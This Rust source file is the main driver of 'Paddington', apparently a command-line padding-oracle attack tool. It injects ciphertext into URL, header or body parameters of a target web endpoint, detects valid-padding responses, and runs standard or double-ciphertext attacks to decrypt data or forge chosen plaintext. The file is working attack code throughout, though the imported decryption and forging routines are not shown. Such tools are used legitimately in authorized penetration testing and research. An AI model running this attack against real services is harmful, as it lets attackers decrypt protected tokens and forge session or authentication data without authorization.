use async_trait::async_trait;
use base64::prelude::*;
use clap::{Parser, ValueEnum, arg, command};
use regex::{Regex, RegexBuilder};
use serde_json::{Result, Value};
use strum_macros::Display;
use urlencoding::{decode, encode};

use crate::{
    crypt::{decrypt::padding_oracle_decrypt, detector::Oracle, forge::padding_oracle_forge},
    helper::Config,
};
use reqwest::{Client, Method, Proxy};

#[derive(Display, Debug, Clone, ValueEnum)]
enum Encoding {
    HEX,
    B64,
    B64Url,
    URL,
}

#[derive(Display, Debug, Clone, ValueEnum)]
enum Block {
    SMALL,
    MED,
    LARGE,
}

#[derive(Display, Debug, Clone, ValueEnum, PartialEq)]
enum Attack {
    DOUBLE,
    SINGLE,
    INTER,
    ALL,
}

#[derive(Parser, Debug)]
#[command(name = "Paddington", version, about = "Padding Oracles Ain't Dead!")]
struct Args {
    ///url for the vulnerable endpoint
    #[arg(short, long)]
    url: String,

    ///params to scan, can be url parameters, body parameters, or headers, alternatively surround the value you want to analyze with "@{ }@"
    #[arg(short, long)]
    params: Vec<String>,

    ///add headers to the request
    #[arg(short = 'H', long)]
    headers: Vec<String>,

    ///add the request body
    #[arg(short, long)]
    data: Option<String>,

    ///the request method to use [default: GET]
    #[arg(short, long, ignore_case = true)]
    method: Option<Method>,

    #[arg(
        short,
        long,
        help = "the encoding to use for the bytes, you can specify multiple encodings and they will be used in order.\nexample: if a string is base64 encoded then URL encoded, use \"-e url\" to url decode, and then \n\"-e b64\" to base64 decode [default: b64]"
    )]
    encoding: Vec<Encoding>,

    ///the number of threads to use
    #[arg(short, long, default_value_t = 10)]
    threads: usize,

    ///the plaintext to forge
    #[arg(short, long)]
    forge: Option<String>,

    ///the block size to use (small = 8) (med = 16) (large = 32)
    #[arg(short, long, ignore_case = true, default_value_t = Block::MED)]
    block_size: Block,

    ///the search string to match a response with valid padding
    #[arg(short, long)]
    search_pat: Option<String>,

    ///the proxy to use
    #[arg(long)]
    proxy: Option<String>,

    ///override the ciphertext to use
    #[arg(short, long)]
    ciphertext: Option<String>,

    #[arg(short, long, ignore_case = true, default_value_t = Attack::ALL, help = "the attack type to use, (single = standard attack) (double = double ciphertext attack) \n(inter = intermediate ciphertext attack, not implemented yet)")]
    attack: Attack,
}

pub mod crypt;
pub mod errors;
pub mod helper;

struct HTTPDoubleOracle {
    single_oracle: HTTPOracle,
    base_ct: Vec<u8>,
}

impl HTTPDoubleOracle {
    fn new(
        url: String,
        headers: Vec<(String, String)>,
        method: Method,
        data: Option<String>,
        encoding: Vec<Encoding>,
        params: Vec<String>,
        search_pat: Option<String>,
        proxy: Option<String>,
    ) -> Self {
        let oracle = HTTPOracle::new(
            url, headers, method, data, encoding, params, search_pat, proxy,
        );
        let base_ct = oracle.base_ct.clone();
        Self {
            single_oracle: oracle,
            base_ct,
        }
    }
}

#[async_trait]
impl Oracle for HTTPDoubleOracle {
    async fn exec(&self, ct: &[u8]) -> String {
        let ct = Vec::from_iter(self.base_ct.iter().chain(ct).cloned());
        return self.single_oracle.exec(&ct).await;
    }
}

struct HTTPOracle {
    url: String,
    headers: Vec<(String, String)>,
    method: Method,
    data: Option<String>,
    encoding: Vec<Encoding>,
    params: Vec<String>,
    search_pat: Option<Regex>,
    base_ct: Vec<u8>,
    proxy: Option<Proxy>,
}

#[async_trait]
impl Oracle for HTTPOracle {
    async fn exec(&self, ct: &[u8]) -> String {
        let mut res = Vec::from(ct);
        let injection_point = String::from("@{INJECT_HERE}@");
        // encode bytes
        for enc in self.encoding.clone().iter().rev() {
            res = match enc {
                Encoding::HEX => hex::encode(res).as_bytes().to_vec(),
                Encoding::B64 => BASE64_STANDARD.encode(res).as_bytes().to_vec(),
                Encoding::B64Url => BASE64_URL_SAFE.encode(res).as_bytes().to_vec(),
                Encoding::URL => encode(
                    &String::from_utf8(res).expect("Error: invalid string when url encoding"),
                )
                .as_bytes()
                .to_vec(),
            };
        }
        let modified_ct = String::from_utf8(res).expect("Invalid utf-8 string after encoding");
        // insert into headers
        let mut headers = vec![];
        for mut header in self.headers.clone() {
            header.1 = header.1.replace(&injection_point, &modified_ct);
            headers.push(header);
        }

        // insert into body data
        let mut data = None;
        if let Some(body_data) = self.data.clone() {
            data = Some(body_data.replace(&injection_point, &modified_ct));
        }

        // insert into url
        let url = self.url.replace(&injection_point, &modified_ct);

        let mut client_builder = Client::builder();

        //add proxy
        if let Some(p) = &self.proxy {
            client_builder = client_builder.proxy(p.clone())
        }

        let client = client_builder
            .build()
            .expect("Error: could not build request");

        let mut req = client.request(self.method.clone(), url);
        // add request body
        if let Some(body) = data {
            req = req.body(body);
        }

        //add request headers
        for header in headers {
            req = req.header(header.0, header.1);
        }

        // println!("Sending request");
        let response = req.send().await;
        if response.is_err() {
            return response.err().unwrap().to_string();
        }

        let response = response.unwrap();
        let mut response_text = String::new();
        response_text += &(response.status().as_str().to_owned() + "\n");
        for header in response.headers().clone() {
            let mut header_text = String::new();
            if let Some(val) = header.0 {
                if val.as_str().to_lowercase().contains("date") {
                    // skip date strings since they always change
                    continue;
                }
                header_text += &(val.as_str().to_owned() + ": ");
            }
            header_text += &(header.1.to_str().unwrap().to_owned() + "\n");
            response_text += &header_text;
        }
        let response_body = response
            .text()
            .await
            .expect("Error: could not convert response body to text");
        response_text += &response_body;

        // println!("{}", response_text);

        if let Some(search) = &self.search_pat {
            return match search.find(&response_text) {
                Some(_) => String::from("matches"),
                None => String::from("no match"),
            };
        }
        return response_text;
    }
}

fn search_json_obj(
    val: &mut Value,
    search_key: String,
    replace_opt: Option<String>,
) -> Option<String> {
    if let Value::Object(map) = val {
        for (key, value) in map {
            if key.eq(&search_key) && value.is_string() {
                let res = Some(value.as_str().unwrap().into());
                if let Some(replace) = replace_opt.clone() {
                    *value = serde_json::Value::String(replace);
                }
                return res;
            } else if value.is_object() {
                let res = search_json_obj(value, search_key.clone(), replace_opt.clone());
                if let Some(res_val) = res {
                    return Some(res_val);
                }
            }
        }
    }
    None
}

fn set_injection_points(oracle: &mut HTTPOracle) -> Option<String> {
    let mut found_ct = None;
    let injection_point = String::from("@{INJECT_HERE}@");
    for p in oracle.params.clone() {
        for i in 0..oracle.headers.len() {
            if oracle.headers[i].0 == p {
                found_ct = Some(oracle.headers[i].1.clone());
                oracle.headers[i].1 = injection_point.clone();
            }
        }
        let temp_url = oracle.url.clone();
        let url = url_encoded_data::from(&temp_url);
        for query_param in url.as_pairs() {
            if p.eq(query_param.0) {
                found_ct = Some(query_param.1.to_string());
                oracle.url = oracle
                    .url
                    .replace(&query_param.1.to_string(), &injection_point);
            }
        }

        if let Some(ref mut body_data) = oracle.data {
            //parse from json data
            let json_data_res: Result<Value> = serde_json::from_str(&body_data.clone());
            if let Ok(mut json_data) = json_data_res {
                if let Some(success_res) =
                    search_json_obj(&mut json_data, p.clone(), Some(injection_point.clone()))
                {
                    found_ct = Some(success_res.clone());
                    if let Ok(string_data) = serde_json::to_string(&json_data) {
                        *body_data = string_data;
                    }
                }
            }

            //parse url form body data
            let data = body_data.clone();
            let form_data = url_encoded_data::from(&data);
            for query_param in form_data.as_pairs() {
                if *query_param.0 == p {
                    found_ct = Some(query_param.1.to_string());
                    *body_data = body_data.replace(&query_param.1.to_string(), &injection_point);
                }
            }
        }
    }
    return found_ct;
}

fn decode_ct(ct: String, encoding: Vec<Encoding>) -> Vec<u8> {
    // decode bytes
    let mut res = Vec::from(ct.as_bytes());
    for enc in encoding {
        res = match enc {
            Encoding::HEX => hex::decode(String::from_utf8(res).expect("Error: invalid string"))
                .expect("Error: invalid hex string"),
            Encoding::B64 => BASE64_STANDARD
                .decode(String::from_utf8(res).expect("Error: invalid string"))
                .expect("Error: invalid b64 string"),
            Encoding::B64Url => BASE64_URL_SAFE
                .decode(String::from_utf8(res).expect("Error: invalid string"))
                .expect("Error: invalid b64 url string"),
            Encoding::URL => {
                decode(&String::from_utf8(res).expect("Error: invalid string when url decoding"))
                    .expect("Error: invalid encoded url string")
                    .as_bytes()
                    .to_vec()
            }
        };
    }
    return res;
}

impl HTTPOracle {
    fn new(
        url: String,
        headers: Vec<(String, String)>,
        method: Method,
        data: Option<String>,
        encoding: Vec<Encoding>,
        params: Vec<String>,
        search_pat: Option<String>,
        proxy: Option<String>,
    ) -> Self {
        let mut pat = None;
        if let Some(search_pat) = search_pat {
            let re = RegexBuilder::new(&search_pat)
                .multi_line(true)
                .build()
                .expect(&("Error: Failed to compile regex ".to_owned() + &search_pat));
            pat = Some(re);
        }
        let mut prox = None;
        if let Some(p) = proxy {
            prox = Some(Proxy::all(p).expect("Error: Invalid proxy"));
        }
        let mut oracle = Self {
            url,
            headers,
            method,
            data,
            encoding,
            params,
            search_pat: pat,
            base_ct: vec![],
            proxy: prox,
        };
        let ct = set_injection_points(&mut oracle).expect("Error: No injection points found");
        let ct = decode_ct(ct, oracle.encoding.clone());
        oracle.base_ct = ct;
        return oracle;
    }
}

fn print_bytes_custom(bytes: &[u8]) {
    for &byte in bytes {
        if byte.is_ascii_graphic() {
            // Cast to char for printing as a character
            print!("{}", byte as char);
        } else {
            // Print as a two-digit uppercase hex value with "0x" prefix
            print!("\\x{:02X}", byte);
        }
    }
    println!(); // Add a newline at the end
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let mut encoding = args.encoding.clone();
    if args.encoding.len() <= 0 {
        encoding = vec![Encoding::B64];
    }

    let mut config = Config::new();
    let block_size = match args.block_size {
        Block::SMALL => 8,
        Block::MED => 16,
        Block::LARGE => 32,
    };
    config.set("blk_size".to_string(), block_size.to_string());
    config.set("threads".to_string(), args.threads.to_string());

    let mut headers: Vec<(String, String)> = vec![];
    for header in args.headers {
        let header_parts = header.split(':').map(String::from).collect::<Vec<String>>();
        if header_parts.len() >= 2 {
            // get the val and remove leading whitespace
            let header_val = header_parts[1..].join("").trim_ascii_start().to_string();
            headers.push((header_parts[0].clone(), header_val));
        }
    }

    let standard_oracle = Box::new(HTTPOracle::new(
        args.url.clone(),
        headers.clone(),
        args.method.clone().unwrap_or(Method::GET),
        args.data.clone(),
        encoding.clone(),
        args.params.clone(),
        args.search_pat.clone(),
        args.proxy.clone(),
    ));
    let standard_ct = standard_oracle.base_ct.clone();
    let double_oracle = Box::new(HTTPDoubleOracle::new(
        args.url,
        headers,
        args.method.unwrap_or(Method::GET),
        args.data,
        encoding.clone(),
        args.params,
        args.search_pat,
        args.proxy,
    ));
    let double_ct = double_oracle.base_ct.clone();

    let mut oracles: Vec<(Box<dyn Oracle>, Vec<u8>, String)> = vec![];

    if args.attack == Attack::ALL || args.attack == Attack::SINGLE {
        oracles.push((
            standard_oracle,
            standard_ct,
            String::from("\nTesting standard padding oracle"),
        ));
    }
    if args.attack == Attack::ALL || args.attack == Attack::DOUBLE {
        oracles.push((
            double_oracle,
            double_ct,
            String::from("\nTesting double padding oracle"),
        ));
    }

    for (oracle, base_ct, log) in oracles {
        println!("{}", log);
        let mut ct = base_ct.clone();
        if let Some(override_ct) = args.ciphertext.clone() {
            ct = decode_ct(override_ct, encoding.clone())
        }
        if let Some(forge_string) = args.forge.clone() {
            let result =
                padding_oracle_forge(forge_string.as_bytes(), &ct.clone(), oracle, config.clone())
                    .await;
            if let Ok(ct) = result {
                println!("forged ciphertext: {}", hex::encode(ct));
                return;
            }
        } else {
            let result = padding_oracle_decrypt(&ct.clone(), oracle, config.clone()).await;
            if let Ok(pt) = result {
                print_bytes_custom(&pt);
                return;
            }
        }
    }
}
